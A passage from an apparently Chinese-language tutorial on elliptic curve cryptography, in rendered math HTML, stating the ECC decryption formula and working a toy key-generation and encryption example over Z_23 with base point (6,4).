style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>。我们可以类推得到ECC的解密公式为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>m</mi></msub><mo>=</mo><msub><mi>C</mi><mn>2</mn></msub><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mi>a</mi><mo>∗</mo><msub><mi>C</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>C</mi><mn>2</mn></msub><mo>−</mo><mi>a</mi><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">P_m=C_2+(-a*C_1)=C_2-aC_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>值得注意的是，加密过程和解密过程中的计算都没有模p。因为这些都是点，两个点相加得时候得计算公式中就是有模p了，相当于每次计算实际都在模p，故最外层就不用写模p了，写了也没用2333，一个点最后怎么模p呢？</p><h3 id="例子-3"><a class="markdownIt-Anchor" href="#例子-3"></a> 例子</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>23</mn></msub></mrow><annotation encoding="application/x-tex">Z_{23}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的椭圆曲线: <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y^2=x^3+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>取<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G=(6, 4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">a=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>，计算</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>A</mi></msub><mo>=</mo><mn>3</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P_A=3*(6, 4)=(6,4)+(6,4)+(6,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span></p><p>我们先算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(6,4)+(6,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>，求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">\alpha=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><mn>13</mn><mo separator="true">,</mo><mtext> </mtext><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">x_R=13,\ y_R=7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span>。即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(6,4)+(6,4)=(13,7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span>。再计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(13,7)+(6,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>。</p><p>求得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>3</mn><mi mathvariant="normal">/</mi><mn>7</mn><mo>=</mo><mn>3</mn><mo>∗</mo><mn>10</mn><mo>=</mo><mn>30</mn><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">\alpha=3/7=3*10=30=7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord">/</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">x_R=7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">y_R=12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span></span></span></span></p><p>得最后的结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(7, 12)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span></span></span></span></p><p>从这里可见ECC的手工计算量有多大，一个普通的乘法实际上内部复杂无比。</p><p>于是公钥为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>23</mn><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(23, (6,4), (7,12))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，私钥为a=3</p><p>假设明文为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>m</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P_m=(5, 4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span></p><p>然后选择随机数k=2，现在开始加密</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>k</mi><mi>G</mi><mo>=</mo><mn>2</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_1=kG=2*(6,4)=(6,4)+(6,4)=(13,7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span 